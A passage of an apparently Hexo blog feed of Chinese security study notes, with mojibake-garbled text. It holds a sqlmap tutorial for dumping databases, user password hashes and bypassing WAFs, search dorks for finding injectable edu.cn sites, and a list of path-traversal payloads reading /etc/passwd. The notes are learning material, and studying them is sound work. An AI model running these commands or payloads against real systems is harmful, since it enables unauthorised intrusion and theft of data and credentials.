<p>è¿™å…³è·Ÿä¸Šæçš„å·®åˆ«å°±æ˜¯æŠŠGETæ–¹æ³•ä¼ çš„save_pathæ”¹æˆäº†ç”¨POSTæ–¹æ³•ä¼ ã€‚è¦æŠŠ%00æˆªæ–­ç¬¦æ”¹æˆåå…­è¿›åˆ¶æˆªæ–­ç¬¦ã€‚</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>é¶åœºç»ƒä¹ </category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
        <tag>upload-labé¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€å®‰å…¨å·¥å…·ã€‘sqlmap</title>
    <url>/posts/23b5c41a/</url>
    <content><![CDATA[<h2 id="æ‰€æœ‰å‘½ä»¤">æ‰€æœ‰å‘½ä»¤</h2>
<p><img src="/posts/23b5c41a//image-20250316160541099.png" alt="image-20250316160541099"></p>
<span id="more"></span>
<p>SQLmapæ˜¯ä¸€æ¬¾ã€Œè‡ªåŠ¨åŒ–ã€<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&amp;spm=1001.2101.3001.7020">SQLæ³¨å…¥</a>å·¥å…·ï¼Œkaliè‡ªå¸¦ã€‚è·¯å¾„ /usr/share/sqlmap</p>
<p>æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥<code>sqlmap</code>ï¼Œå‡ºç°ä»¥ä¸‹ç•Œé¢ï¼Œå°±è¯´æ˜SQLmapã€Œå¯ç”¨ã€ã€‚</p>
<p><img src="/posts/23b5c41a//3323630f970599810ae0f763b683dfe5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æœ¬ç¯‡æ–‡ç« ä½¿ç”¨æœ¬åœ°æ­å»ºçš„SQL-labsé¶åœºä½œä¸ºã€Œæ¼”ç¤ºã€ç›®æ ‡ï¼Œå…¶ä»–ç›®æ ‡å¯ä½¿ç”¨å¿…åº”æœç´¢ä»¥ä¸‹ç±»å‹çš„ç½‘ç«™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">inurl:news.asp?<span class="built_in">id</span>=site:edu.cn</span><br><span class="line">inurl:news.php?<span class="built_in">id</span>= site:edu.cn</span><br><span class="line">inurl:news.aspx?<span class="built_in">id</span>=site:edu.cn</span><br></pre></td></tr></table></figure>
<p><img src="/posts/23b5c41a//f8c3e9690521f33f60d6a89532b65714.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="å¿«é€Ÿå…¥é—¨">å¿«é€Ÿå…¥é—¨</h2>
<p><strong>SQLmapï¼ˆå¸¸è§„ï¼‰ä½¿ç”¨æ­¥éª¤</strong></p>
<p>1ã€æ£€æµ‹ã€Œæ³¨å…¥ç‚¹ã€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span></span><br></pre></td></tr></table></figure>
<p>2ã€æŸ¥çœ‹æ‰€æœ‰ã€Œæ•°æ®åº“ã€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --dbs</span><br></pre></td></tr></table></figure>
<p>3ã€æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æ•°æ®åº“</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --current-db</span><br></pre></td></tr></table></figure>
<p>4ã€æŸ¥çœ‹ã€Œæ•°æ®è¡¨ã€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p>5ã€æŸ¥çœ‹ã€Œå­—æ®µã€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p>6ã€æŸ¥çœ‹ã€Œæ•°æ®ã€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<h2 id="æ£€æµ‹ç›®æ ‡">æ£€æµ‹ç›®æ ‡</h2>
<p>æ£€æµ‹ã€Œæ³¨å…¥ç‚¹ã€å‰ï¼Œéœ€è¦æŒ‡å®šéœ€è¦æ£€æµ‹çš„ã€Œå¯¹è±¡ã€ã€‚</p>
<h3 id="æŒ‡å®šurl">æŒ‡å®šurl</h3>
<p><code>-u</code> å‚æ•°ï¼ŒæŒ‡å®šéœ€è¦æ£€æµ‹çš„urlï¼Œå•/åŒå¼•å·åŒ…è£¹ã€‚ä¸­é—´å¦‚æœæœ‰æç¤ºï¼Œå°±è¾“å…¥yã€‚</p>
<p>æç¤ºï¼šSQLmapä¸èƒ½ç›´æ¥ã€Œæ‰«æã€ç½‘ç«™æ¼æ´ï¼Œå…ˆç”¨å…¶ä»–æ‰«æå·¥å…·æ‰«å‡ºæ³¨å…¥ç‚¹ï¼Œå†ç”¨SQLmapéªŒè¯å¹¶ã€Œåˆ©ç”¨ã€æ³¨å…¥ç‚¹ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27;</span><br></pre></td></tr></table></figure>
<p>æ‰«æå®Œæˆåï¼Œå‘Šè¯‰æˆ‘ä»¬å­˜åœ¨çš„æ³¨å…¥ç±»å‹å’Œä½¿ç”¨çš„æ•°æ®åº“åŠç‰ˆæœ¬ã€‚</p>
<p><img src="/posts/23b5c41a//image-20250316162233436.png" alt="image-20250316162233436"></p>
<h3 id="æŒ‡å®šæ–‡ä»¶ï¼ˆæ‰¹é‡æ£€æµ‹ï¼‰">æŒ‡å®šæ–‡ä»¶ï¼ˆæ‰¹é‡æ£€æµ‹ï¼‰</h3>
<p>å‡†å¤‡ä¸€ä¸ªã€Œæ–‡ä»¶ã€ï¼Œå†™ä¸Šéœ€è¦æ£€æµ‹çš„å¤šä¸ªurlï¼Œä¸€è¡Œä¸€ä¸ªã€‚</p>
<p><code>-m</code> æŒ‡å®šæ–‡ä»¶ï¼Œå¯ä»¥ã€Œæ‰¹é‡æ‰«æã€æ–‡ä»¶ä¸­çš„urlï¼Œéœ€è¦ç¡®è®¤å°±æŒ‰yã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -m urls.txt</span><br></pre></td></tr></table></figure>
<h3 id="æŒ‡å®šæ•°æ®åº“-è¡¨-å­—æ®µ">æŒ‡å®šæ•°æ®åº“/è¡¨/å­—æ®µ</h3>
<p><code>-D</code> æŒ‡å®šç›®æ ‡ã€Œæ•°æ®åº“ã€ï¼Œå•/åŒå¼•å·åŒ…è£¹ï¼Œå¸¸é…åˆå…¶ä»–å‚æ•°ä½¿ç”¨ã€‚</p>
<p><code>-T</code> æŒ‡å®šç›®æ ‡ã€Œè¡¨ã€ï¼Œå•/åŒå¼•å·åŒ…è£¹ï¼Œå¸¸é…åˆå…¶ä»–å‚æ•°ä½¿ç”¨ã€‚</p>
<p><code>-C</code> æŒ‡å®šç›®æ ‡ã€Œå­—æ®µã€ï¼Œå•/åŒå¼•å·åŒ…è£¹ï¼Œå¸¸é…åˆå…¶ä»–å‚æ•°ä½¿ç”¨ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -C <span class="string">&#x27;username&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<h3 id="postè¯·æ±‚">postè¯·æ±‚</h3>
<p>æ£€æµ‹ã€Œpostè¯·æ±‚ã€çš„æ³¨å…¥ç‚¹ï¼Œä½¿ç”¨BPç­‰å·¥å…·ã€ŒæŠ“åŒ…ã€ï¼Œå°†httpè¯·æ±‚å†…å®¹ä¿å­˜åˆ°txtæ–‡ä»¶ä¸­ã€‚</p>
<p><code>-r</code> æŒ‡å®šéœ€è¦æ£€æµ‹çš„æ–‡ä»¶ï¼ŒSQLmapä¼šé€šè¿‡postè¯·æ±‚æ–¹å¼æ£€æµ‹ç›®æ ‡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r bp.txt</span><br></pre></td></tr></table></figure>
<h3 id="cookieæ³¨å…¥">cookieæ³¨å…¥</h3>
<p><code>--cookie</code> æŒ‡å®šcookieçš„å€¼ï¼Œå•/åŒå¼•å·åŒ…è£¹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://xx?id=x&quot;</span> --cookie <span class="string">&#x27;cookie&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="WAFç»•è¿‡">WAFç»•è¿‡</h3>
<p><code>--tamper</code> æŒ‡å®šç»•è¿‡è„šæœ¬ï¼Œç»•è¿‡WAFæˆ–idsç­‰ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --tamper <span class="string">&#x27;space2comment.py&#x27;</span></span><br></pre></td></tr></table></figure>
<p>SQLmapå†…ç½®äº†å¾ˆå¤šç»•è¿‡è„šæœ¬ï¼Œåœ¨ /usr/share/sqlmap/tamper/ ç›®å½•ä¸‹ï¼š</p>
<p><img src="/posts/23b5c41a//image-20250316163642927.png" alt="image-20250316163642927"></p>
<p>è„šæœ¬æŒ‰ç…§ç”¨é€”å‘½åï¼Œæ¯”å¦‚ <a href="http://space2comment.py">space2comment.py</a> æ˜¯æŒ‡ï¼Œç”¨/**/ä»£æ›¿ç©ºæ ¼ã€‚</p>
<p>å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥æ ¹æ®å†…ç½®è„šæœ¬æ ¼å¼ï¼Œè‡ªå·±å®šä¹‰ç»•è¿‡è„šæœ¬ã€‚</p>
<h3 id="å…¶ä»–">å…¶ä»–</h3>
<p><code>--batch</code> ï¼ˆé»˜è®¤ç¡®è®¤ï¼‰ä¸å†è¯¢é—®æ˜¯å¦ç¡®è®¤ã€‚</p>
<p><code>--level 1</code> æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º1ï¼Œå¸¸ç”¨3ï¼‰</p>
<p><code>--method=GET</code> æŒ‡å®šè¯·æ±‚æ–¹å¼ï¼ˆGET/POSTï¼‰</p>
<p><code>--random-agent</code> éšæœºåˆ‡æ¢UAï¼ˆUser-Agentï¼‰</p>
<p><code>--user-agent ' '</code> ä½¿ç”¨è‡ªå®šä¹‰çš„UAï¼ˆUser-Agentï¼‰</p>
<p><code>--referer ' '</code> ä½¿ç”¨è‡ªå®šä¹‰çš„ referer</p>
<p><code>--proxy=&quot;127.0.0.1:8080&quot;</code> æŒ‡å®šä»£ç†</p>
<p><code>--threads 10</code> è®¾ç½®çº¿ç¨‹æ•°ï¼Œæœ€é«˜10</p>
<p><code>--risk=1</code> é£é™©çº§åˆ«ï¼ˆ0~3ï¼Œé»˜è®¤1ï¼Œå¸¸ç”¨1ï¼‰ï¼Œçº§åˆ«æé«˜ä¼šå¢åŠ æ•°æ®è¢«ç¯¡æ”¹çš„é£é™©ã€‚</p>
<p><code>--level 1</code> æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º1ï¼Œå¸¸ç”¨3ï¼‰</p>
<h2 id="è„±åº“">è„±åº“</h2>
<p>è·å–æ‰€æœ‰å†…å®¹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; -a</span><br></pre></td></tr></table></figure>
<p><code>-a</code> å°±æ˜¯ all çš„æ„æ€ï¼Œè·å–æ‰€æœ‰èƒ½è·å–çš„å†…å®¹ï¼Œä¼šæ¶ˆè€—å¾ˆé•¿æ—¶é—´ã€‚</p>
<h3 id="è·å–æ•°æ®åº“">è·å–æ•°æ®åº“</h3>
<p><code>--dbs</code> è·å–æ•°æ®åº“</p>
<p><strong>1ã€è·å–æ•°æ®åº“ç‰ˆæœ¬</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; -b</span><br></pre></td></tr></table></figure>
<p><strong>2ã€è·å–å½“å‰ä½¿ç”¨çš„æ•°æ®åº“</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; --current-db</span><br></pre></td></tr></table></figure>
<p><strong>3ã€è·å–æ‰€æœ‰æ•°æ®åº“</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --dbs</span><br></pre></td></tr></table></figure>
<h3 id="è·å–è¡¨">è·å–è¡¨</h3>
<p><code>--tables</code> è·å–è¡¨</p>
<p><strong>1ã€è·å–è¡¨ï¼Œå¯ä»¥æŒ‡å®šæ•°æ®åº“</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p><strong>2ã€åŒæ—¶è·å–å¤šä¸ªåº“çš„è¡¨åï¼Œåº“åç”¨é€—å·åˆ†éš”ã€‚</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security,sys&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p><strong>3ã€ä¸æŒ‡å®šæ•°æ®åº“ï¼Œé»˜è®¤è·å–æ¯ä¸ªæ•°æ®åº“ä¸­æ‰€æœ‰çš„è¡¨ã€‚</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<h3 id="è·å–å­—æ®µ">è·å–å­—æ®µ</h3>
<p><code>--columns</code> å‚æ•°ç”¨æ¥è·å–å­—æ®µã€‚</p>
<p><strong>1ã€è·å–å­—æ®µï¼Œå¯ä»¥æŒ‡å®šåº“å’Œè¡¨</strong></p>
<p>æç¤ºï¼šåªæŒ‡å®šåº“åä½†ä¸æŒ‡å®šè¡¨åä¼šæŠ¥é”™ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --columns</span><br></pre></td></tr></table></figure>
<p><strong>2ã€ä¸æŒ‡å®šè¡¨åï¼Œé»˜è®¤è·å–å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„å­—æ®µã€‚</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --columns</span><br></pre></td></tr></table></figure>
<h3 id="è·å–å­—æ®µç±»å‹">è·å–å­—æ®µç±»å‹</h3>
<p><code>--schema</code> è·å–å­—æ®µç±»å‹ï¼Œå¯ä»¥æŒ‡å®šåº“æˆ–æŒ‡å®šè¡¨ã€‚ä¸æŒ‡å®šåˆ™è·å–æ•°æ®åº“ä¸­æ¯ä¸ªè¡¨æ‰€æœ‰å­—æ®µçš„ç±»å‹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --schema</span><br></pre></td></tr></table></figure>
<h3 id="è·å–å€¼ï¼ˆæ•°æ®ï¼‰">è·å–å€¼ï¼ˆæ•°æ®ï¼‰</h3>
<p><code>--dump</code> è·å–å€¼ï¼Œä¹Ÿå°±æ˜¯è¡¨ä¸­çš„æ•°æ®ã€‚å¯ä»¥æŒ‡å®šå…·ä½“çš„åº“ã€è¡¨ã€å­—æ®µã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -C <span class="string">&#x27;username,password&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<p>è·å–æŒ‡å®šåº“ä¸­æ‰€æœ‰è¡¨çš„æ•°æ®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<p>é»˜è®¤è·å–è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ <code>--start</code> <code>--stop</code> æŒ‡å®šå¼€å§‹å’Œç»“æŸçš„è¡Œï¼Œåªè·å–ä¸€éƒ¨åˆ†æ•°æ®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --start 1 --stop 5  --dump</span><br></pre></td></tr></table></figure>
<h3 id="è·å–ç”¨æˆ·">è·å–ç”¨æˆ·</h3>
<p><strong>1ã€è·å–å½“å‰ç™»å½•æ•°æ®åº“çš„ç”¨æˆ·</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.31.180/sqli-labs-master/Less-1/?id=1&#x27; --current-user</span><br></pre></td></tr></table></figure>
<p><strong>2ã€è·å–æ‰€æœ‰ç”¨æˆ·</strong></p>
<p><code>--users</code> è·å–æ•°æ®åº“çš„æ‰€æœ‰ç”¨æˆ·åã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
<p><strong>3ã€è·å–ç”¨æˆ·å¯†ç </strong></p>
<p><code>--passwords</code> è·å–æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·çš„å¯†ç ï¼ˆå“ˆå¸Œå€¼ï¼‰ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --passwords</span><br></pre></td></tr></table></figure>
<p>æ•°æ®åº“ä¸å­˜å‚¨æ˜æ–‡å¯†ç ï¼Œåªä¼šå°†å¯†ç åŠ å¯†åï¼Œå­˜å‚¨å¯†ç çš„å“ˆå¸Œå€¼ï¼Œæ‰€ä»¥è¿™é‡Œåªèƒ½æŸ¥å‡ºæ¥å“ˆå¸Œå€¼ï¼›å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥å€ŸåŠ©å·¥å…·æŠŠå®ƒä»¬è§£ææˆæ˜æ–‡ã€‚æœ€åé¢æ˜¾ç¤ºæ•°æ®åº“ç”¨æˆ·åå¯¹åº”çš„å¯†ç çš„å“ˆå¸Œå€¼ã€‚</p>
<p><strong>6.4ã€è·å–ç”¨æˆ·æƒé™</strong></p>
<p><code>--privileges</code> æŸ¥çœ‹æ¯ä¸ªæ•°æ®åº“ç”¨æˆ·éƒ½æœ‰å“ªäº›æƒé™ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --privileges</span><br></pre></td></tr></table></figure>
<p><strong>6.5ã€åˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯ä¸æ˜¯ç®¡ç†å‘˜</strong></p>
<p><code>--is-dba</code> åˆ¤æ–­å½“å‰ç™»å½•çš„ç”¨æˆ·æ˜¯ä¸æ˜¯æ•°æ®åº“çš„ç®¡ç†å‘˜è´¦å·ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --is-dba</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ˜¯ç®¡ç†å‘˜ï¼Œå°±åœ¨æœ€åé¢æ˜¾ç¤º trueã€‚</p>
<h3 id="è·å–ä¸»æœºå">è·å–ä¸»æœºå</h3>
<p><code>--hostname</code> è·å–æœåŠ¡å™¨ä¸»æœºåã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --hostname</span><br></pre></td></tr></table></figure>
<h3 id="æœç´¢åº“ã€è¡¨ã€å­—æ®µã€‚">æœç´¢åº“ã€è¡¨ã€å­—æ®µã€‚</h3>
<p><code>--search</code> æœç´¢æ•°æ®åº“ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šåº“/è¡¨/å­—æ®µï¼Œéœ€è¦æŒ‡å®šåº“å/è¡¨å/å­—æ®µåã€‚</p>
<p>æœç´¢æ•°æ®åº“ä¸­æœ‰æ²¡æœ‰ security è¿™ä¸ªæ•°æ®åº“ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --search</span><br></pre></td></tr></table></figure>
<p>éœ€è¦æ‰‹åŠ¨é€‰æ‹©æ¨¡ç³ŠåŒ¹é…ï¼ˆ1ï¼‰è¿˜æ˜¯å®Œå…¨åŒ¹é…ï¼ˆ2ï¼‰ï¼Œè€Œåè¿”å›åŒ¹é…çš„ç»“æœã€‚</p>
<p><img src="/posts/23b5c41a//image-20250316163205508.png" alt="image-20250316163205508"></p>
<p>ä¹Ÿå¯ä»¥æœç´¢è¡¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xxx/?id=1&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --search</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…æœç´¢å­—æ®µ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -C <span class="string">&#x27;username&#x27;</span> --search</span><br></pre></td></tr></table></figure>
<h3 id="æ­£åœ¨æ‰§è¡Œçš„SQLè¯­å¥">æ­£åœ¨æ‰§è¡Œçš„SQLè¯­å¥</h3>
<p><code>--statements</code> è·å–æ•°æ®åº“ä¸­æ­£åœ¨æ‰§è¡Œçš„SQLè¯­å¥ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --statements </span><br></pre></td></tr></table></figure>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<p><a href="https://blog.csdn.net/wangyuxiang946/article/details/131236510">SQLmapä½¿ç”¨æ•™ç¨‹å›¾æ–‡æ•™ç¨‹ï¼ˆè¶…è¯¦ç»†ï¼‰</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>å®‰å…¨å·¥å…·</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€æ¸—é€æ€è·¯ã€‘æ€»ç»“</title>
    <url>/posts/cc26bc47/</url>
    <content><![CDATA[<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>ã€æ¸—é€æ€»ç»“ã€‘è·¯å¾„éå†ä¸æ–‡ä»¶ä¸Šä¼ </title>
    <url>/posts/3cec027e/</url>
    <content><![CDATA[<h2 id="ç›®å½•éå†">ç›®å½•éå†</h2>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç›¸å¯¹è·¯å¾„éå†</span></span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»å¯¹è·¯å¾„éå†</span></span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=/</span>etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># åµŒå¥—éå†</span></span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=..../</span><span class="regexp">/..../</span><span class="regexp">/..../</span><span class="regexp">/etc/</span>/passwd</span><br><span class="line">https:<span class="regexp">//i</span>nsecure-website.com<span class="regexp">/loadImage?filename=..../</span><span class="regexp">/..../</span><span class="regexp">/..../</span><span class="regexp">/etc/</span>/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># URLç¼–ç éå†</span></span><br><span class="line"><span class="comment"># å•å±‚ç›¸å¯¹</span></span><br><span class="line">filename=%<span class="number">2</span>e%<span class="number">2</span>e%<span class="number">2</span>fetc%<span class="number">2</span>fpasswd</span><br><span class="line"><span class="comment"># åŒå±‚ç›¸å¯¹</span></span><br><span class="line">filename=%<span class="number">252</span>e%<span class="number">252</span>e%<span class="number">252</span>fetc%<span class="number">2</span>fpasswd</span><br><span class="line"><span class="comment"># åŒå±‚ç›¸å¯¹</span></span><br><span class="line">filename=.%%<span class="number">32</span>%<span class="number">65</span><span class="regexp">/.%%32%65/</span>.%%<span class="number">32</span>%<span class="number">65</span><span class="regexp">/etc/</span>passwd</span><br><span class="line"><span class="comment"># ä»é¢„æœŸåŸºæœ¬æ–‡ä»¶å¤¹å¼€å§‹</span></span><br><span class="line">filename=<span class="regexp">/var/</span>www<span class="regexp">/images/</span>...%<span class="number">2</span>f...%<span class="number">2</span>f...%<span class="number">2</span>fetc/passwd</span><br><span class="line"><span class="comment"># ç©ºå­—èŠ‚æˆªæ–­</span></span><br><span class="line">filename=...<span class="regexp">/.../</span>...<span class="regexp">/etc/</span>passwd%<span class="number">00</span>.png</span><br></pre></td></tr></table></figure>
<h2 id="å…¥é—¨">å…¥é—¨</h2>
<h2 id="è¿›é˜¶">è¿›é˜¶</h2>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>æ¸—é€æ€»ç»“</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢â€”â€”å¼€å¯æˆ‘çš„æ–°ç¯‡ç« </title>
    <url>/posts/8d60c6a5/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong password, please try again.Or you can contact the author to view the blog" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="a8d7e2f33774a5f253ec0740f4dbc9f129e18bab288fec2a5980b7878ddc2ccb">35e94af5aa3de4403be2a274c3bae36ffa679d444bbf2c0ce98987b44b30a2b177390b045ff9b811b9d33ebdbc694d1dc87365728d7c66f7bd90d31b5c38ab9214a97f9a3b1e49c46ec95f9c4eb8dce252ab22ff16259921bf1f5d25bb525c592e381a68ea7bc6b289b36993d1d2a8ace0a87a2f629e64256dbfe2806228ad0ddb14ffedbbc828533f60c7c295453636a6eca6d52d1a5b5244a569529d38f5b8a542f55f8310e64fd67b6894930d4ca3405233fc057a8fecc27cdda65788f5c54afb9df1ceff2e4850e97f108f8c13d1ae6ad241254e6d769f7c9856d224a79665f2e112d88473eea7213660d383bf252530df3cfc4de7e20a54c29c095f96e0a4aa9d367bbd54003e0bf6e01feef60f2cbd0ba0163ff4f8f087a6cb96f4ab5c4c599b882784d6b5650a556c015cbb5783a0c2602c202d24102ccb956fea82c5cbb27c13aa71abab04872d1937e79219b736615f4dc8316f6cf39f47d3ddfb9090469d1580718b328590cbfe9fe587e5512f9e551e6262afb1e04f209c51a8b3e951047add3f7252927fe57dd4bf40082d69fb57736df952e0cd93a13064ca2cf3cbdd5bcc552b5d1a36731a8e2603688dc175d8d0c97199c772cc0da2d530e3fd11faef6409192d5cdb1b1b126eefaf715aac31abff5640bdb8a459b894d3377df065d688fbdf018d06b254d55e2850d9f51e45df44e5d0e46365b97b6518c507ecd6ec7daa3d39d51f04f2821fcc13022eddf99230bb0922b6a4d07ca4c685d89d36855932b8e4f43899ca240d5ff65cfb1b562162d2c3943011aa910ff0efbfcabce9a754068bcf104dbe47f669b2dd3352ef38af2b67a3d7779abe764acc791ed67c87c3d47c584c7707676d272656c7dd8965aed1b9102294839383a31d661814af63dac327167bacc6a4820ceecda28a1ec2807021d4ec958455daf076fd068351c323402eea19dcfc103796af4f7de106d80a196058fd5f9bd565807b56c7fd2172bbe5a3640719744db438e047f8d091a745d08e91ff6928e4809c52569450e65998dcf096dfd4260c91ac3122b0259235787528f9